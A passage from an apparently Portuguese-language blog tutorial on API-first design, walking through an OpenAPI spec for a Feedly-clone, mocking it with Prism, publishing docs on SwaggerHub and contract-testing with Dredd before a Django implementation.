    &lt;span class="nt"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Conteúdo completo do artigo&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;image&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;imagem-principal-do-artigo-2.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;channel&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;XYZ&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;url&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://article-2.html&amp;quot;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Além disso, esboçamos as seguintes rotas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;GET /api/v1/channels/&amp;lt;id-do-channel&amp;gt;&lt;/code&gt;: Pega a lista de artigos&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GET /api/v1/articles/&amp;lt;id-do-artigo&amp;gt;&lt;/code&gt;: Pega o artigo completo&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Vamos ocultar complexidades fora do escopo da &lt;em&gt;user story&lt;/em&gt; apresentada (como por exemplo, paginação e
autenticação). Além disso, propositalmente não definimos um formato "oficial" para &lt;code&gt;pub_date&lt;/code&gt;, apenas
determinamos que deverá ser uma data em &lt;em&gt;UTC&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Por tratar-se de um esboço inicial que gerará material para a definição do &lt;em&gt;style guide&lt;/em&gt; da &lt;em&gt;API&lt;/em&gt; e dos &lt;em&gt;endpoints&lt;/em&gt;
em si, é natural deixarmos passar alguns detalhes que podem gerar problemas de integração.&lt;/p&gt;
&lt;h2&gt;2: Projete e valide&lt;/h2&gt;
&lt;p&gt;Abaixo, o documento representando exatamente o que foi acordado na seção anterior, com &lt;em&gt;OpenApi Specification&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;openapi&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;3.0.2&amp;quot;&lt;/span&gt;
&lt;span class="nt"&gt;info&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Feedly-clone&lt;/span&gt;
  &lt;span class="nt"&gt;version&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;v1&lt;/span&gt;
&lt;span class="nt"&gt;paths&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;/channels&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Set of channels, e.g. blogs, websites or podcasts&lt;/span&gt;
    &lt;span class="nt"&gt;get&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="s"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;List of channels&lt;/span&gt;
          &lt;span class="nt"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nt"&gt;application/json&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
              &lt;span class="nt"&gt;schema&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;array&lt;/span&gt;
                &lt;span class="nt"&gt;items&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                  &lt;span class="nt"&gt;$ref&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;#/components/schemas/Channel&amp;quot;&lt;/span&gt;

  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;/channels/{id}&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;parameters&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;$ref&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;#/components/parameters/id&amp;quot;&lt;/span&gt;
    &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Details of a channel&lt;/span&gt;
    &lt;span class="nt"&gt;get&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="s"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Channel detail response&lt;/span&gt;
          &lt;span class="nt"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nt"&gt;application/json&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
              &lt;span class="nt"&gt;schema&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="nt"&gt;$ref&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;#/components/schemas/Channel&amp;quot;&lt;/span&gt;

  &lt;span class="nt"&gt;/articles&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Set of items&lt;/span&gt;
    &lt;span class="nt"&gt;get&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="s"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;List of articles&lt;/span&gt;
          &lt;span class="nt"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nt"&gt;application/json&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
              &lt;span class="nt"&gt;schema&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;array&lt;/span&gt;
                &lt;span class="nt"&gt;items&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                  &lt;span class="nt"&gt;$ref&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;#/components/schemas/Article&amp;quot;&lt;/span&gt;

  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;/articles/{id}&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;parameters&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;$ref&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;#/components/parameters/id&amp;quot;&lt;/span&gt;
    &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Details of an article&lt;/span&gt;
    &lt;span class="nt"&gt;get&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="s"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Article detail response&lt;/span&gt;
          &lt;span class="nt"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nt"&gt;application/json&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
              &lt;span class="nt"&gt;schema&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="nt"&gt;$ref&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;#/components/schemas/Article&amp;quot;&lt;/span&gt;

&lt;span class="nt"&gt;components&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;parameters&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;id&lt;/span&gt;
      &lt;span class="nt"&gt;in&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;path&lt;/span&gt;
      &lt;span class="nt"&gt;required&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;true&lt;/span&gt;
      &lt;span class="nt"&gt;schema&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;integer&lt;/span&gt;
  &lt;span class="nt"&gt;schemas&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;Channel&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;properties&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;integer&lt;/span&gt;
        &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;

    &lt;span class="nt"&gt;Article&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;properties&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;integer&lt;/span&gt;
        &lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
        &lt;span class="nt"&gt;pub_date&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
        &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
        &lt;span class="nt"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
        &lt;span class="nt"&gt;image&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
        &lt;span class="nt"&gt;channel&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
        &lt;span class="nt"&gt;url&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O artigo &lt;a href="https://klauslaube.com.br/2018/03/15/swagger-na-pratica.html" title="Leia o artigo na íntegra"&gt;"Swagger na prática"&lt;/a&gt; pode ser de ajuda caso você não esteja familiarizado com a
síntaxe acima.&lt;/p&gt;
&lt;h3&gt;Projete&lt;/h3&gt;
&lt;p&gt;A partir daqui podemos pensar sob a ótica de casos de uso.
&lt;a href="https://klauslaube.com.br/2020/01/07/software-design-software-architecture.html" title="Software Design x Software Architecture"&gt;Práticas e ferramentas podem variar&lt;/a&gt;
dependendo da sua criatividade e do seu time. Para fins didáticos vamos manter esse passo o mais simples possível.&lt;/p&gt;
&lt;p&gt;Para início de conversa o &lt;em&gt;path&lt;/em&gt; &lt;code&gt;articles/&lt;/code&gt; não está alinhado o suficiente com a semântica por trás do problema. O formato &lt;em&gt;RSS&lt;/em&gt; chama o que estamos chamando de &lt;code&gt;Article&lt;/code&gt; de &lt;code&gt;Item&lt;/code&gt;, logo,
se quisermos manter uma linguagem ubíqua é fundamental renomearmos esse elemento.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/deathstar.jpg" width="600" height="317" title="Projetar é uma arte, desconhecida pelo Império (movieweb.com)" alt="Projetar é uma arte, desconhecida pelo Império (movieweb.com)"&gt;&lt;/p&gt;
&lt;p&gt;Outro ponto de controvérsia em nosso esboço é que o recurso &lt;code&gt;articles/&lt;/code&gt; poderia ser um &lt;em&gt;nested resource&lt;/em&gt; de &lt;code&gt;channels/{id}/&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;channels/{id}&lt;/code&gt;: Detalhes do &lt;em&gt;channel&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;channels/{id}/items&lt;/code&gt;: Lista de &lt;em&gt;items&lt;/em&gt; daquele &lt;em&gt;channel&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;channels/{channel-id}/items/{item-id}&lt;/code&gt;: Detalhes do &lt;em&gt;item&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Digamos que após consultar os &lt;em&gt;stakeholders&lt;/em&gt; de &lt;em&gt;mobile&lt;/em&gt; e &lt;em&gt;web&lt;/em&gt;, eles concordem com a alteração. É exatamente esse tipo
de questionamento que esse passo deve trazer, além de instigar a discussão com demais interessados.&lt;/p&gt;
&lt;p&gt;Por último, mas não menos importante, vamos supor que nossos possíveis clientes não estejam propensos a mostrar
o conteúdo completo dos artigos em sua listagem. Logo, eles estariam fazendo "over-fetching" de informação. Podemos
remover esse campo (&lt;code&gt;content&lt;/code&gt;) de &lt;code&gt;channels/{id}/items/{id}&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;A especificação final você pode &lt;a href="https://gist.github.com/kplaube/d9c16eec70895349c48f9e8ec9e3e5be" title="Veja mais no Gist"&gt;conferir aqui&lt;/a&gt;.&lt;/p&gt;
&lt;h4&gt;Antes de ir: Over-fetching e Under-fetching&lt;/h4&gt;
&lt;p&gt;&lt;em&gt;Over-fetching&lt;/em&gt; (trazer mais conteúdo do que o necessário em um &lt;em&gt;request&lt;/em&gt;) e &lt;em&gt;under-fetching&lt;/em&gt; (trazer menos conteúdo do
que o necessário) são problemas comuns em &lt;em&gt;APIs&lt;/em&gt; &lt;em&gt;REST&lt;/em&gt; que possuem pluralidade de clientes.&lt;/p&gt;
&lt;p&gt;Soluções variam, das mais ingênuas (criar um &lt;em&gt;endpoint&lt;/em&gt; para &lt;em&gt;mobile&lt;/em&gt; e um para &lt;em&gt;web&lt;/em&gt;, por exemplo) até as mais rebuscadas
(como deixar o &lt;em&gt;REST&lt;/em&gt; de lado e adotar &lt;em&gt;GraphQL&lt;/em&gt;). O "meio-termo" seria a adoção de algum mecanismo que permita ao cliente
especificar quais campos ele deseja carregar na requisição.&lt;/p&gt;
&lt;p&gt;E é exatamente isso que o &lt;a href="https://github.com/rsinger86/drf-flex-fields" title="Veja o repositório no Github"&gt;&lt;em&gt;FlexFields&lt;/em&gt;&lt;/a&gt; faz
para soluções escritas em &lt;em&gt;REST Framework&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Valide&lt;/h3&gt;
&lt;p&gt;É hora de validarmos o contrato.&lt;/p&gt;
&lt;p&gt;Poderíamos escrever &lt;em&gt;views&lt;/em&gt; muito simples em &lt;em&gt;Django&lt;/em&gt; (por exemplo) que atendam a especificação ao responder conteúdo estático. Mas possivelmente a melhor forma de executarmos esse passo seja através de ferramentas chamadas &lt;a href="https://openapi.tools/#mock" title="Veja uma lista de mock servers"&gt;&lt;em&gt;mock servers&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;As opções são as mais variadas, em diferentes linguagens. A minha sugestão é o &lt;a href="https://github.com/stoplightio/prism" title="Veja o repositório no Github"&gt;&lt;em&gt;Prism&lt;/em&gt;&lt;/a&gt;,
uma ferramenta escrita em &lt;em&gt;Javascript&lt;/em&gt;, fácil de instalar e usar.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://stoplight.io/p/docs/gh/stoplightio/prism/docs/getting-started/01-installation.md?srn=gh/stoplightio/prism/docs/getting-started/01-installation.md" title="Documentação oficial do Prism"&gt;Veja como instalar o &lt;em&gt;Prism&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Executando o &lt;em&gt;Prism&lt;/em&gt; com a especificação passada como argumento, temos um servidor fornecendo o contrato via &lt;em&gt;REST&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ prism mock openapi.yml

› &lt;span class="o"&gt;[&lt;/span&gt;CLI&lt;span class="o"&gt;]&lt;/span&gt; …  awaiting  Starting Prism…
› &lt;span class="o"&gt;[&lt;/span&gt;CLI&lt;span class="o"&gt;]&lt;/span&gt; ℹ  info      GET        http://127.0.0.1:4010/channels
› &lt;span class="o"&gt;[&lt;/span&gt;CLI&lt;span class="o"&gt;]&lt;/span&gt; ℹ  info      GET        http://127.0.0.1:4010/channels/869
› &lt;span class="o"&gt;[&lt;/span&gt;CLI&lt;span class="o"&gt;]&lt;/span&gt; ℹ  info      GET        http://127.0.0.1:4010/channels/857/items
› &lt;span class="o"&gt;[&lt;/span&gt;CLI&lt;span class="o"&gt;]&lt;/span&gt; ℹ  info      GET        http://127.0.0.1:4010/channels/226/items/12
› &lt;span class="o"&gt;[&lt;/span&gt;CLI&lt;span class="o"&gt;]&lt;/span&gt; ▶  start     Prism is listening on http://127.0.0.1:4010

$ curl http://127.0.0.1:4010/channels/1/items/1

&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;:1,&lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Anthony Mackie fala sobre se tornar o Capitão América&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;pub_date&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Sat, 29 Feb 2020 19:21:37 +0000&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;summary&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Quero que o meu Capitão América represente todo mundo, não só um grupo específico de pessoas&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;image&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;https://uploads.jovemnerd.com.br/wp-content/uploads/2020/02/anthony-mackie-capitao-america.jpg&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Conteúdo completo&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;url&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;https://jovemnerd.com.br/nerdbunker/anthony-mackie-fala-sobre-se-tornar-o-capitao-america/&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Isso permite que novas avaliações sejam realizadas, modificações aconteçam com antecedência, casos de uso sejam testados,
e até mesmo que outros &lt;em&gt;stakeholders&lt;/em&gt; comecem a desenvolver a parte deles sem precisar esperar pelo &lt;em&gt;backend&lt;/em&gt; todo estar pronto.&lt;/p&gt;
&lt;h2&gt;3: Oficialize a especificação&lt;/h2&gt;
&lt;p&gt;Nesse passo estruturamos o &lt;em&gt;release&lt;/em&gt; da especificação, gerenciamos o processo e futuras iterações, e (claro) versionamos o arquivo.&lt;/p&gt;
&lt;p&gt;Enquanto trabalhei na &lt;a href="https://loadsmart.com/" title="Book a truck in seconds"&gt;&lt;em&gt;Loadsmart&lt;/em&gt;&lt;/a&gt;, mantínhamos a especificação em um repositório &lt;em&gt;Git&lt;/em&gt; e tínhamos
um &lt;em&gt;build&lt;/em&gt; no &lt;em&gt;CI&lt;/em&gt; para publicar a documentação baseada na versão do arquivo que encontrava-se no &lt;code&gt;master&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Possuímos várias opções para esse passo. Talvez o &lt;a href="https://github.com/Redocly/redoc" title="Visite o repositório no Github"&gt;&lt;em&gt;ReDoc&lt;/em&gt;&lt;/a&gt;
seja a ferramenta mais estilosa para gerar documentação a partir do &lt;em&gt;OpenAPI&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para fins didáticos vou usar a ferramenta do &lt;em&gt;Swagger&lt;/em&gt; e expor a documentação no
&lt;a href="https://swagger.io/tools/swagger-ui/" title="Teste na nuvem"&gt;&lt;em&gt;SwaggerHub&lt;/em&gt;&lt;/a&gt;: &lt;a href="https://app.swaggerhub.com/apis-docs/kplaube/feedly-clone/v1"&gt;https://app.swaggerhub.com/apis-docs/kplaube/feedly-clone/v1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/api-first-swagger-ui.png" width="740" height="277" title="Documentação publicada no Swagger UI" alt="Documentação publicada no Swagger UI"&gt;&lt;/p&gt;
&lt;h2&gt;4: Teste&lt;/h2&gt;
&lt;p&gt;Teste sempre. Automatize sempre que possível.&lt;/p&gt;
&lt;p&gt;Nessa etapa validaremos e garantiremos o funcionamento do contrato. Casos de uso podem ser necessários para estressar
a coerência da &lt;em&gt;API&lt;/em&gt;. Particularmente, não acho que essa seja a camada mais interessante para testar coisas além do
contrato estabelecido (como por exemplo, a própria lógica de negócio). Pode tornar-se uma linha tênue em sua
&lt;a href="https://martinfowler.com/articles/practical-test-pyramid.html" title="The Practical Test Pyramid"&gt;pirâmide de testes&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;a href="https://dredd.org/en/latest/quickstart.html" title="Documentação do Dredd"&gt;&lt;em&gt;Dredd&lt;/em&gt;&lt;/a&gt; é uma ferramenta bem interessante para testar
a especificação construída. Ela utiliza um servidor como alvo, portanto, podemos adicioná-la ao &lt;em&gt;build pipeline&lt;/em&gt;,
levantarmos o nosso serviço, e ela operará como uma espécie de &lt;em&gt;Component Test&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Executando contra o nosso servidor &lt;em&gt;mockado&lt;/em&gt;, tudo deveria funcionar "out of the box":&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ dredd ./openapi.yml http://127.0.0.1:4010

warn: API description parser warning in /Users/klaus/Desktop/openapi.yml:66 &lt;span class="o"&gt;(&lt;/span&gt;from line &lt;span class="m"&gt;66&lt;/span&gt; column &lt;span class="m"&gt;7&lt;/span&gt; to column &lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;Parameter Object&amp;#39;&lt;/span&gt; contains unsupported key &lt;span class="s1"&gt;&amp;#39;schema&amp;#39;&lt;/span&gt;
warn: API description parser warning in /Users/klaus/Desktop/openapi.yml:73 &lt;span class="o"&gt;(&lt;/span&gt;from line &lt;span class="m"&gt;73&lt;/span&gt; column &lt;span class="m"&gt;7&lt;/span&gt; to column &lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;Parameter Object&amp;#39;&lt;/span&gt; contains unsupported key &lt;span class="s1"&gt;&amp;#39;schema&amp;#39;&lt;/span&gt;
warn: API description parser warning in /Users/klaus/Desktop/openapi.yml:102 &lt;span class="o"&gt;(&lt;/span&gt;from line &lt;span class="m"&gt;102&lt;/span&gt; column &lt;span class="m"&gt;7&lt;/span&gt; to column &lt;span class="m"&gt;12&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;Schema Object&amp;#39;&lt;/span&gt; contains unsupported key &lt;span class="s1"&gt;&amp;#39;allOf&amp;#39;&lt;/span&gt;
pass: GET &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;200&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; /channels duration: 63ms
pass: GET &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;200&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; /channels/1 duration: 20ms
pass: GET &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;200&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; /channels/1/items duration: 14ms
pass: GET &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;200&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; /channels/1/items/1 duration: 11ms
complete: &lt;span class="m"&gt;4&lt;/span&gt; passing, &lt;span class="m"&gt;0&lt;/span&gt; failing, &lt;span class="m"&gt;0&lt;/span&gt; errors, &lt;span class="m"&gt;0&lt;/span&gt; skipped, &lt;span class="m"&gt;4&lt;/span&gt; total
complete: Tests took 116ms
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Um outro extra muito interessante
é a &lt;a href="https://dredd.org/en/latest/hooks/python.html" title="Leia mais na documentação do Dredd"&gt;possibilidade de escrever &lt;em&gt;hooks&lt;/em&gt; em &lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, o que nos permite criar casos de uso de acordo com diferentes aspectos e contextos.&lt;/p&gt;
&lt;h2&gt;5: Implemente&lt;/h2&gt;
&lt;p&gt;Agora sim! Finalmente a parte divertida.&lt;/p&gt;
&lt;p&gt;Agora é correr para o &lt;em&gt;Django&lt;/em&gt; e implementar a &lt;em&gt;API&lt;/em&gt;. Se você estiver interessado no &lt;em&gt;Django REST Framework&lt;/em&gt;, escrevi sobre ele recentemente no &lt;a href="https://klauslaube.com.br/2020/02/13/construindo-apis-em-django-com-django-rest-framework.html" title="Leia o artigo na íntegra"&gt;"Construindo APIs em Django com Django REST Framework"&lt;/a&gt;. Não perca.&lt;/p&gt;
